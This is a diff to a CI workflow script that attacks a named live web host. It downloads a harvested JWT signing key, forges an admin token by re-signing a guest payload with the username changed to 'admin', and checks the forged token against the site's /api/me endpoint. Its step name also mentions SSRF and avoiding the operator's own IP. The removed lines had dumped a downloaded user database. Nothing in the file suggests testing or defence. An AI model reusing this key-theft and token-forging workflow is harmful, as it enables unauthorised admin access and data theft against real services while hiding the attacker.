@@ -5,7 +5,7 @@ jobs:
   admin:
     runs-on: ubuntu-latest
     steps:
-      - name: reharvest jwt.key + dump schema + forge admin JWT + SSRF (zero own-IP)
+      - name: reharvest jwt.key + forge admin JWT (signature-only) + SSRF (zero own-IP)
         run: |
           set +e
           B="https://pan.yazinb.icu"
@@ -17,60 +17,34 @@ jobs:
           dl () { curl -skS -m120 "$1" -o "$2" -w "  dl $2 -> HTTP %{http_code} bytes=%{size_download}\n"; }
           U=$(get_raw "/$SUB/jwt.key"); dl "$U" /tmp/jwt.key
           echo "jwt.key ascii=[$(cat /tmp/jwt.key)]  sha256=$(sha256sum /tmp/jwt.key|cut -c1-32)"
-          U=$(get_raw "/$SUB/data/artex.sqlite"); dl "$U" /tmp/artex.sqlite
-          echo "artex.sqlite size=$(wc -c < /tmp/artex.sqlite)"
-          echo "=== SCHEMA + FORGE (visible diagnostics, robust table pick) ==="
+          export GT="$TOKEN"
+          echo "=== FORGE admin JWT (mirror guest payload, swap username, resign with key) ==="
           python3 - <<'PY' 2>&1 | tee /tmp/forge.out
-          import sqlite3,hmac,hashlib,base64,json,time
-          c=sqlite3.connect('/tmp/artex.sqlite')
-          alltabs=[r[0] for r in c.execute("select name from sqlite_master where type=?",('table',))]
-          print("ALLTABLES",alltabs)
-          ut=None;uc=[]
-          for t in alltabs:
-              cols=[d[1] for d in c.execute('PRAGMA table_info(%s)'%t)]
-              low=[x.lower() for x in cols]
-              has_user=any(('user' in x) or ('uname' in x) for x in low)
-              has_pass=any(('pass' in x) or ('pwd' in x) or ('hash' in x) for x in low)
-              has_role=any(('role' in x) or ('perm' in x) for x in low)
-              print("TAB",t,"COLS",cols)
-              if has_user and (has_pass or has_role) and ut is None:
-                  ut=t;uc=cols
-          if ut is None:
-              for t in alltabs:
-                  if 'user' in t.lower():
-                      ut=t;uc=[d[1] for d in c.execute('PRAGMA table_info(%s)'%t)];break
-          print("CHOSEN_UT",ut,"COLS",uc)
-          rows=list(c.execute('select * from %s'%ut))
-          print("ROWCOUNT",len(rows))
-          lc=[x.lower() for x in uc]
-          uidx=next((i for i,x in enumerate(lc) if x in ('username','user','uname','name')),0)
-          pidx=next((i for i,x in enumerate(lc) if x in ('password','pass','pwd','hash','password_hash')),-1)
-          ridx=next((i for i,x in enumerate(lc) if x in ('role','permission','perm','is_admin')),-1)
-          admin_row=None
-          for r in rows:
-              d=dict(zip(uc,r))
-              u=str(d.get(uc[uidx]) or '')
-              mask=list(r)
-              if pidx>=0: mask[pidx]='***'
-              print("ROW",dict(zip(uc,mask)))
-              if u.lower()=='admin': admin_row=r;break
-          if admin_row is None and rows: admin_row=rows[0]
-          d=dict(zip(uc,admin_row))
-          uname=str(d.get(uc[uidx]) or d.get('username') or '')
-          pts=0
-          if 'pwd_ts' in lc: pts=d[uc[lc.index('pwd_ts')]]
-          print("FORGE_USER",uname,"PWDTS",pts)
+          import base64,json,hmac,hashlib,time,os
           key=open('/tmp/jwt.key','rb').read().strip()
-          b=lambda x:base64.urlsafe_b64encode(x).rstrip(b'=')
+          def ud(x):
+              x+='='*(-len(x)%4); return json.loads(base64.urlsafe_b64decode(x))
+          t=os.environ.get('GT','')
+          hh,pp,ss=t.split('.')
+          ghead=ud(hh); gpay=ud(pp)
+          print("GUEST_HEADER",ghead)
+          print("GUEST_PAYLOAD",gpay)
+          payload=dict(gpay)
+          payload['username']='admin'
           now=int(time.time())
+          for k in ('exp','iat','nbf'):
+              if k in payload: payload[k]=now+(3600 if k=='exp' else 0)
+          if 'pwd_ts' not in payload: payload['pwd_ts']=0
+          b=lambda x:base64.urlsafe_b64encode(x).rstrip(b'=')
           h=b(json.dumps({'alg':'HS256','typ':'JWT'}).encode())
-          p=b(json.dumps({'exp':now+3600,'iat':now,'nbf':now,'username':uname,'pwd_ts':int(pts)}).encode())
+          p=b(json.dumps(payload).encode())
           s=b(hmac.new(key,h+b'.'+p,hashlib.sha256).digest())
+          print("ADMIN_PAYLOAD",payload)
           print("JWT:"+h.decode()+'.'+p.decode()+'.'+s.decode())
           PY
           ADMINJWT=$(grep -E '^JWT:eyJ' /tmp/forge.out | head -1 | sed 's/^JWT://')
           echo "ADMINJWT_LEN=${#ADMINJWT}"
-          echo "ADMINJWT_HEAD=${ADMINJWT:0:30}"
+          echo "ADMINJWT_HEAD=${ADMINJWT:0:40}"
           if [ -z "$ADMINJWT" ]; then echo "FORGE FAILED"; cat /tmp/forge.out; exit 0; fi
           echo "--- /api/me (admin verify) ---"
           curl -skS -m20 -X GET "$B/api/me" -H "Authorization: $ADMINJWT" -w "\n  HTTP %{http_code}\n" | head -c 600
